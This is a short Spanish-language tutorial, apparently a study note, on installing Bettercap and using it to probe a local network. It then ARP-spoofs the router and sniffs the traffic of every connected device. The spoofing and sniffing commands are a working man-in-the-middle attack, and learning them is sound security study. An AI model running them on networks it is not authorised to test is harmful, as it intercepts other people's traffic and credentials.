## Análisis con Bettercap

Bettercap es una herramienta potente, flexible y portátil creada para realizar varios tipos de ataques MITM contra una red, manipular HTTP, HTTPS y tráfico TCP en tiempo real, buscar credenciales y mucho más.

---

## Instalación

```bash
sudo apt-get install build-essential ruby-dev libpcap-dev

apt-get update
apt-get install bettercap
```

---

## Uso

### Inicio básico

Abrimos una nueva terminal y ejecutamos los siguientes comandos:

```bash
bettercap
net.probe on
ticker on
```

Como podemos observar, se muestran las IP de nuestra red local.

![Informatica](IP.jpg)

---

### Escaneo y análisis de IPs

En la misma terminal ejecutamos de nuevo **bettercap**, seleccionamos la IP que vamos a analizar. En este caso vamos a analizar todas las IP, para esto seleccionamos la IP del router:

```bash
set arp.spoof.targets 192.168.1.1
arp.spoof on
set net.sniff.verbose false
net.sniff on
```

Esto mostrará todo el tráfico de todos los dispositivos conectados.

![Informatica](Ciberseguridad/Herramientas/Bettercap/Img/trafico.png)

---
